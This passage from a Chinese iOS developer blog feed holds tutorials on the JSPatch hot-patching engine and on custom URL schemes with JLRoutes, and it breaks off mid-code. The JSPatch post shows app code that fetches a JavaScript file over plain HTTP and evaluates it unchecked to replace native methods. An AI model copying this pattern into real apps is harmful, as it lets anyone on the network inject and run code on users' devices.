<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x63;&#111;&#100;&#101;&#114;&#102;&#x69;&#x73;&#x68;&#x40;&#49;&#x36;&#51;&#46;&#99;&#111;&#109;">&#x63;&#111;&#100;&#101;&#114;&#102;&#x69;&#x73;&#x68;&#x40;&#49;&#x36;&#51;&#46;&#99;&#111;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;问题重现&quot;&gt;&lt;a href=&quot;#问题重现&quot; class=&quot;headerlink&quot; title=&quot;问题重现&quot;&gt;&lt;/a&gt;问题重现&lt;/h1&gt;&lt;p&gt;最近在做项目的时候，我们选择了一个可以下载iClould图片的三方Picker——CTAssetsPickerController，这个Picker会根据不同系统版本，返回不同类型的图片资源。&lt;/p&gt;
&lt;p&gt;iOS8之前，访问系统照片视频使用的是 AssetsLibrary 框架，iOS8之后有了新的系统框架PhotoKit，这一框架对iCloud选图有很好的支持。&lt;/p&gt;
&lt;p&gt;AssetsLibrary的图片资源类型是ALAsset，而PhotoKit的图片资源类型是PHAsset。&lt;/p&gt;
&lt;p&gt;如果通过PHAsset获取图片资源，可以调用以下方法：&lt;/p&gt;
&lt;figure class=&quot;highlight objc&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[[PHImageManager defaultManager] requestImageForAsset:asset targetSize:&lt;span class=&quot;built_in&quot;&gt;CGSizeMake&lt;/span&gt;(pixelWidth, pixelHeight) contentMode:PHImageContentModeAspectFit options:&lt;span class=&quot;literal&quot;&gt;nil&lt;/span&gt; resultHandler:^(&lt;span class=&quot;built_in&quot;&gt;UIImage&lt;/span&gt; * _Nullable result, &lt;span class=&quot;built_in&quot;&gt;NSDictionary&lt;/span&gt; * _Nullable info) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// 回调部分&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;];&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS——为你的项目引入超轻量级JS引擎JSPatch</title>
    <link href="http://zhoulingyu.com/2016/01/16/iOS%E2%80%94%E2%80%94%E4%B8%BA%E4%BD%A0%E7%9A%84%E9%A1%B9%E7%9B%AE%E5%BC%95%E5%85%A5%E8%B6%85%E8%BD%BB%E9%87%8F%E7%BA%A7JS%E5%BC%95%E6%93%8EJSPatch/"/>
    <id>http://zhoulingyu.com/2016/01/16/iOS——为你的项目引入超轻量级JS引擎JSPatch/</id>
    <published>2016-01-16T08:10:11.000Z</published>
    <updated>2016-08-05T06:23:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-JSPatch"><a href="#1-JSPatch" class="headerlink" title="1. JSPatch"></a>1. JSPatch</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JSPatch是由国内一位年轻帅气的大牛bang编写的极小的JS引擎文件</p>
<p>这个开源项目(<a href="http://jspatch.com" target="_blank" rel="external">主页</a>、<a href="https://github.com/bang590/JSPatch" target="_blank" rel="external">Github连接</a>)，让你只需要在项目里引入极小的引擎文件，就可以使用 JavaScript 调用任何 Objective-C 的原生接口，替换任意 Objective-C 原生方法。</p>
<p>我了解这个项目的原因是因为项目的大神率先用了这个Mini引擎解决了我们线上BUG的燃眉之急，当我去学习这个引擎的时候，我觉得我的移动编码观被震撼了，这绝对是有重大意义的项目，所以推荐给所有还不了解人</p>
<h2 id="JSPatch解决了什么问题"><a href="#JSPatch解决了什么问题" class="headerlink" title="JSPatch解决了什么问题"></a>JSPatch解决了什么问题</h2><p>JSPatch可以调用一段JS替换OC原生方法。而最关键的是JSPatch调用的JS不仅可以是本地的，还可以是网络请求来的。</p>
<p>试想一下，当你的项目已经上线了，用户反馈给你一堆BUG，作为一个优秀的程序员，你一定会第一时间修正BUG并且在一定修复量之后发布新的版本。但是问题是：你的用户不一定会更新新版本的app。</p>
<p>这里暴露了移动端的一个弊端：不能像服务器端一样实时发布，即使修复了BUG用户却可以不选择更新。</p>
<p>而JSPatch由于可以从网络请求JS替换你原本的代码，你可以在在服务器端设置一个借口获取一个JS文件，当你的项目出现问题是，你可以通过向JS文件中编写代码来实时修复你的BUG。所以JSPatch可以完美的实时修复线上bug。</p>
<a id="more"></a>
<h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>常规的两种：</p>
<ol>
<li><p>CocoaPods</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Your Podfile</div><div class="line">platform :ios, '6.0'</div><div class="line">pod 'JSPatch'</div></pre></td></tr></table></figure>
</li>
<li><p>手动导入<br> 简历JSPatch/目录，拖入：</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">JSEngine.m</div><div class="line">JSEngine.h</div><div class="line">JSPatch.js</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>非常简单，在<code>AppDelegate</code>的<code>didFinishLaunchingWithOptions</code>方法中加入JSPatch的初始化代码</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[JPEngine startEngine];</div><div class="line">    </div><div class="line"><span class="comment">// 导入本地存放的js</span></div><div class="line"><span class="built_in">NSString</span> *sourcePath = [[<span class="built_in">NSBundle</span> mainBundle] pathForResource:<span class="string">@"sample"</span> ofType:<span class="string">@"js"</span>];</div><div class="line"><span class="built_in">NSString</span> *script = [<span class="built_in">NSString</span> stringWithContentsOfFile:sourcePath encoding:<span class="built_in">NSUTF8StringEncoding</span> error:<span class="literal">nil</span>];</div><div class="line">[JPEngine evaluateScript:script];</div></pre></td></tr></table></figure>
<p>上面这些代码，是小鱼在本次演示中使用的，sourcePath指向的是项目中的sample.js（sample.js现在是空的）</p>
<p>除了上面我写的这种本地加载JS，更常用的是通过向服务器请求JS，JSPatch提供了非常全面的加载方法：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">[JPEngine startEngine];</div><div class="line"></div><div class="line"><span class="comment">// 直接用NSString写一段JS</span></div><div class="line">[JPEngine evaluateScript:<span class="string">@"\</span></div><div class="line"> var alertView = require('UIAlertView').alloc().init();\</div><div class="line"> alertView.setTitle('Alert');\</div><div class="line"> alertView.setMessage('AlertView from js'); \</div><div class="line"> alertView.addButtonWithTitle('OK');\</div><div class="line"> alertView.show(); \</div><div class="line">"];</div><div class="line"></div><div class="line"><span class="comment">// 从网络请求JS</span></div><div class="line">[<span class="built_in">NSURLConnection</span> sendAsynchronousRequest:[<span class="built_in">NSURLRequest</span> requestWithURL:[<span class="built_in">NSURL</span> URLWithString:<span class="string">@"http://cnbang.net/test.js"</span>]] queue:[<span class="built_in">NSOperationQueue</span> mainQueue] completionHandler:^(<span class="built_in">NSURLResponse</span> *response, <span class="built_in">NSData</span> *data, <span class="built_in">NSError</span> *connectionError) &#123;</div><div class="line">    <span class="built_in">NSString</span> *script = [[<span class="built_in">NSString</span> alloc] initWithData:data encoding:<span class="built_in">NSUTF8StringEncoding</span>];</div><div class="line">    [JPEngine evaluateScript:script];</div><div class="line">&#125;];</div><div class="line"></div><div class="line"><span class="comment">// exec local js file</span></div><div class="line"><span class="built_in">NSString</span> *sourcePath = [[<span class="built_in">NSBundle</span> mainBundle] pathForResource:<span class="string">@"sample"</span> ofType:<span class="string">@"js"</span>];</div><div class="line"><span class="built_in">NSString</span> *script = [<span class="built_in">NSString</span> stringWithContentsOfFile:sourcePath encoding:<span class="built_in">NSUTF8StringEncoding</span> error:<span class="literal">nil</span>];</div><div class="line">[JPEngine evaluateScript:script];</div></pre></td></tr></table></figure>
<p>OK，继续，我们来写一段错误代码</p>
<ol>
<li>ViewController的Storyboard中拖入了一个UILabel，并且拖好线</li>
<li><p>给ViewController加一个数组</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 现在的属性有：</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">weak</span>, <span class="keyword">nonatomic</span>) <span class="keyword">IBOutlet</span> <span class="built_in">UILabel</span> *lblText;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableArray</span> *array;</div></pre></td></tr></table></figure>
</li>
<li><p>给数组加个懒加载</p>
 <figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">- (<span class="built_in">NSMutableArray</span> *)array &#123;</div><div class="line">  	 <span class="keyword">if</span> (_array == <span class="literal">nil</span>) &#123;</div><div class="line">   	    _array = [<span class="built_in">NSMutableArray</span> array];</div><div class="line">  	 &#125;</div><div class="line"> 	  <span class="keyword">return</span> _array;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>在viewDidLoad中这样写</p>
</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)viewDidLoad &#123;</div><div class="line">    [<span class="keyword">super</span> viewDidLoad];</div><div class="line">    </div><div class="line">    [<span class="keyword">self</span>.array addObject:<span class="string">@"first"</span>];</div><div class="line">    [<span class="keyword">self</span>.array addObject:<span class="string">@"second"</span>];</div><div class="line">    [<span class="keyword">self</span>.array addObject:<span class="string">@"third"</span>];</div><div class="line">    </div><div class="line">    [<span class="keyword">self</span> test];</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (<span class="keyword">void</span>)test &#123;</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"%@"</span>, <span class="keyword">self</span>.array[<span class="number">3</span>]);</div><div class="line">    <span class="keyword">self</span>.lblText.text = <span class="keyword">self</span>.array[<span class="number">3</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>显然会出错是不是？毕竟数组中只有3个元素</p>
<p>OK，运行，然后程序崩了</p>
<p>我们尝试用JSPatch解决<br>现在我们原来空空如也的sample.js派上了用场，在里面写入</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">// sample.js</div><div class="line">defineClass('ViewController', &#123;</div><div class="line">            test: function() &#123;</div><div class="line">            // 获取数组中第一个元素</div><div class="line">            var content = self.array().objectAtIndex(0);</div><div class="line">            // 获取label控件</div><div class="line">            var label = self.lblText();</div><div class="line">            // 设置label控件的文字</div><div class="line">            label.setText(content);</div><div class="line">            </div><div class="line">            &#125;</div><div class="line">            &#125;);</div></pre></td></tr></table></figure>
<p>再运行，你会发现不会出错，页面中的Label显示了”first”字样</p>
<p>以上的JS起到的作用是：重新编写『ViewController』中的『test』方法</p>
<p>是不是非常简单，关于语法，在<a href="https://github.com/bang590/JSPatch/wiki/基础用法" target="_blank" rel="external">这里</a>查看JSPatch的wiki，不要害怕，都是非常易懂的，就算你没有学JS，妹子我觉得这是见过最良心的文档了，简单易读还是中文，bang帅哥棒棒的</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>想想一下，上面的问题，如果这时候你的项目已经上线了，所有用户浏览这个页面时都会崩溃，必须及时修复。Don’t worry，如果你已经预先在<code>AppDelegate</code>的<code>didFinishLaunchingWithOptions</code>中做了网络加载，你只需要去修改那段js，所有线上的用户问题都会被及时解决</p>
<h1 id="3-源码"><a href="#3-源码" class="headerlink" title="3. 源码"></a>3. 源码</h1><p>老规矩，这里奉上上面demo的<a href="http://download.csdn.net/detail/u010127917/9407227" target="_blank" rel="external">源码</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#99;&#111;&#x64;&#x65;&#x72;&#x66;&#x69;&#x73;&#x68;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#111;&#109;">&#99;&#111;&#x64;&#x65;&#x72;&#x66;&#x69;&#x73;&#x68;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#111;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-JSPatch&quot;&gt;&lt;a href=&quot;#1-JSPatch&quot; class=&quot;headerlink&quot; title=&quot;1. JSPatch&quot;&gt;&lt;/a&gt;1. JSPatch&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;JSPatch是由国内一位年轻帅气的大牛bang编写的极小的JS引擎文件&lt;/p&gt;
&lt;p&gt;这个开源项目(&lt;a href=&quot;http://jspatch.com&quot;&gt;主页&lt;/a&gt;、&lt;a href=&quot;https://github.com/bang590/JSPatch&quot;&gt;Github连接&lt;/a&gt;)，让你只需要在项目里引入极小的引擎文件，就可以使用 JavaScript 调用任何 Objective-C 的原生接口，替换任意 Objective-C 原生方法。&lt;/p&gt;
&lt;p&gt;我了解这个项目的原因是因为项目的大神率先用了这个Mini引擎解决了我们线上BUG的燃眉之急，当我去学习这个引擎的时候，我觉得我的移动编码观被震撼了，这绝对是有重大意义的项目，所以推荐给所有还不了解人&lt;/p&gt;
&lt;h2 id=&quot;JSPatch解决了什么问题&quot;&gt;&lt;a href=&quot;#JSPatch解决了什么问题&quot; class=&quot;headerlink&quot; title=&quot;JSPatch解决了什么问题&quot;&gt;&lt;/a&gt;JSPatch解决了什么问题&lt;/h2&gt;&lt;p&gt;JSPatch可以调用一段JS替换OC原生方法。而最关键的是JSPatch调用的JS不仅可以是本地的，还可以是网络请求来的。&lt;/p&gt;
&lt;p&gt;试想一下，当你的项目已经上线了，用户反馈给你一堆BUG，作为一个优秀的程序员，你一定会第一时间修正BUG并且在一定修复量之后发布新的版本。但是问题是：你的用户不一定会更新新版本的app。&lt;/p&gt;
&lt;p&gt;这里暴露了移动端的一个弊端：不能像服务器端一样实时发布，即使修复了BUG用户却可以不选择更新。&lt;/p&gt;
&lt;p&gt;而JSPatch由于可以从网络请求JS替换你原本的代码，你可以在在服务器端设置一个借口获取一个JS文件，当你的项目出现问题是，你可以通过向JS文件中编写代码来实时修复你的BUG。所以JSPatch可以完美的实时修复线上bug。&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS——Scheme是什么、怎么自定义Scheme、JLRoutes的使用</title>
    <link href="http://zhoulingyu.com/2016/01/03/iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88%E3%80%81%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme%E3%80%81JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://zhoulingyu.com/2016/01/03/iOS——Scheme是什么、怎么自定义Scheme、JLRoutes的使用/</id>
    <published>2016-01-03T06:34:12.000Z</published>
    <updated>2016-08-05T06:23:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>转到移动端开发后居然现在才用到Scheme真是惭愧惭愧。</p>
<h1 id="URL-Scheme是什么"><a href="#URL-Scheme是什么" class="headerlink" title="URL Scheme是什么"></a>URL Scheme是什么</h1><p>相信大家都知道URL。</p>
<p><a href="http://www.apple.com就是一个URL。" target="_blank" rel="external">http://www.apple.com就是一个URL。</a></p>
<p>而://之前的部分就称为Scheme</p>
<p>（所以，你看，其实并没有什么难的，在这里多插一句给新人的话：不要看到新东西就觉得难，其实很多时候难的就是在于你看到新事物而不敢去研究）</p>
<p>也就是说<a href="http://www.apple.com的Scheme就是http。" target="_blank" rel="external">http://www.apple.com的Scheme就是http。</a></p>
<h1 id="iOS中的URL-Scheme"><a href="#iOS中的URL-Scheme" class="headerlink" title="iOS中的URL Scheme"></a>iOS中的URL Scheme</h1><p>iOS中的Scheme也是一样的，无非是定义应用自己的Scheme，然后定义一些自己的URL解析，就好像YourApp://OneController?username=xxx&amp;userInput=xxx</p>
<p>有了这些URL Scheme你可以像网页跳转一样通过URL来传递参数、信息。</p>
<p>比如常见的分享功能，从其他应用点击微信分享，会自动跳转到微信APP的朋友圈发表动态页面，并填好相应的动态内容。你可以想象一下其URL Scheme可能是这样的：weixin://dl/moments?content=”今天在学习URL Scheme”&amp;src=”zhoulingyu.com”（我只是举个例子）</p>
<p>有一点需要注意的是，和Web开发不同，iOS中并不是所有的页面或者操作都有URL Schemes，这完全是由你主导的的，如果你需要，你就可以自己定义一些，并去解析。</p>
<h1 id="自定义你应用的Scheme"><a href="#自定义你应用的Scheme" class="headerlink" title="自定义你应用的Scheme"></a>自定义你应用的Scheme</h1><a id="more"></a>
<h2 id="什么时候用到URL-Scheme"><a href="#什么时候用到URL-Scheme" class="headerlink" title="什么时候用到URL Scheme"></a>什么时候用到URL Scheme</h2><p>自定义Scheme是有意义的<br>有以下几种使用场景供你参考：</p>
<ol>
<li>从一个页面跳转到另一个页面，你不想写N多行代码来『获取下一个控制器』-&gt;『创建控制器』-&gt;『传递参数』</li>
<li>从其他应用中跳转到你的应用中特定的位置，并填好相应的参数。比如微博分享的时候，是从另一个页面跳转到微博应用的『发微博』页面，并自动填好了微博的文字内容</li>
</ol>
<h2 id="开始写代码吧"><a href="#开始写代码吧" class="headerlink" title="开始写代码吧"></a>开始写代码吧</h2><h3 id="使用浏览器访问应用"><a href="#使用浏览器访问应用" class="headerlink" title="使用浏览器访问应用"></a>使用浏览器访问应用</h3><p>我们建一个应用，就叫URLSchemeDemo</p>
<ol>
<li>在storyboard中，给我们的应用加一个按钮，便于展示<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-01.png-w500" alt=""></li>
<li>打开info.plist<ul>
<li>添加一行，key选择 URL types<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-02.png-w500" alt=""></li>
<li>点击左边箭头打开列表，可以看到 Item 0。打开Item 0，可以看到 URL Identifier，这是你自定义的 URL scheme 的名字。如果想保证唯一性，可以使用翻转域名比如 com.taobao.ios.yourApp<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-03.png-w500" alt=""></li>
<li>给 Item 0 再新增一行，从下拉列表中选择 URL Schemes。你会发现这是一个Array，这是因为允许应用定义多个 URL schemes<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-04.png-w500" alt=""></li>
<li>打开URL schemes并点击里面的Item 0。在value中定义你的 URL scheme 的名字。比如你的APP名<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-05.png-w500" alt=""></li>
</ul>
</li>
<li>在AppDelegate.m中要处理接收到的URL Scheme</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">- (<span class="built_in">BOOL</span>)application:(<span class="built_in">UIApplication</span> *)application openURL:(<span class="built_in">NSURL</span> *)url sourceApplication:(<span class="built_in">NSString</span> *)sourceApplication annotation:(<span class="keyword">id</span>)annotation &#123;</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"从哪个app跳转而来 Bundle ID: %@"</span>, sourceApplication);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"URL scheme:%@"</span>, [url scheme]);</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> <span class="literal">YES</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>运行项目，当app安装到设备上时，URL Scheme将会自动注册</li>
<li>打开Safari在地址栏输入URLSchemeDemo://（你刚刚在URL schemes中定义的Scheme）<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-06.png-w375" alt=""></li>
<li>回车调整转，Safari会提示你『在URLSchemeDemo中打开连接吗？』<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-07.png-w375" alt=""></li>
<li>点击确认，你会发现跳转到了你的应用中，并且后台也打印了相应的处理内容<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-08.png-w375" alt=""><br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-09.png-w500" alt=""></li>
</ol>
<h3 id="使用另一个应用访问应用"><a href="#使用另一个应用访问应用" class="headerlink" title="使用另一个应用访问应用"></a>使用另一个应用访问应用</h3><p>上面编写了如何从浏览器通过URL Scheme跳转应用，下面将展示如何从另一个应用跳转到本应用</p>
<p>再建一个项目，就叫URLSchemeDemoTest</p>
<ol>
<li>在storyboard中拉一个按钮<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-10.png-w375" alt=""></li>
<li>给按钮添加事件</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">IBAction</span>)jump:(<span class="built_in">UIButton</span> *)sender &#123;</div><div class="line">    <span class="built_in">NSString</span> *customURL = <span class="string">@"URLSchemeDemo://"</span>;</div><div class="line">    [[<span class="built_in">UIApplication</span> sharedApplication] openURL:[<span class="built_in">NSURL</span> URLWithString:customURL]];</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>运行项目，点击按钮，你会发现同样能跳转到之前的应用</li>
</ol>
<h1 id="JLRoutes"><a href="#JLRoutes" class="headerlink" title="JLRoutes"></a>JLRoutes</h1><p>看到这里可能有人问了，我可以在跳转的时候传递一些参数吗？</p>
<p>当然可以，这些参数你都可以自己添加，但是同样要在<code>- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation</code>中做解析。<br>比如像YourAPP://SecondController?content=”成功解析”这样的URL Scheme，可能自己解析起来非常的费劲</p>
<p>在这里介绍一个第三方工具<a href="https://github.com/joeldev/JLRoutes" target="_blank" rel="external">JLRoutes</a>，可以非常方便的解析自定义URL Scheme</p>
<h2 id="使用JLRoutes"><a href="#使用JLRoutes" class="headerlink" title="使用JLRoutes"></a>使用JLRoutes</h2><p>比如我们现在就要解析URLSchemeDemo://SecondController，希望使用这个URLScheme直接可以打开URLSchemeDemo应用中的SecondController</p>
<h3 id="URLSchemeDemo项目"><a href="#URLSchemeDemo项目" class="headerlink" title="URLSchemeDemo项目"></a>URLSchemeDemo项目</h3><ol>
<li>导入JLRoutes.h、JLRoutes.m</li>
<li>我在URLSchemeDemo中添加SecondViewController</li>
<li>给SecondViewController在viewDidLoad中添加以下颜色，以作区分</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)viewDidLoad &#123;</div><div class="line">    [<span class="keyword">super</span> viewDidLoad];</div><div class="line">    <span class="keyword">self</span>.view.backgroundColor = [<span class="built_in">UIColor</span> greenColor];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>在AppDelegate.m中修改处理方式</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//  AppDelegate.m</span></div><div class="line"><span class="comment">//  URLSchemeDemo</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//  Created by 周凌宇 on 16/1/3.</span></div><div class="line"><span class="comment">//  Copyright © 2016年 周凌宇. All rights reserved.</span></div><div class="line"><span class="comment">//</span></div><div class="line"></div><div class="line"><span class="meta">#import <span class="meta-string">"AppDelegate.h"</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">"JLRoutes.h"</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">AppDelegate</span> ()</span></div><div class="line"></div><div class="line"><span class="keyword">@end</span></div><div 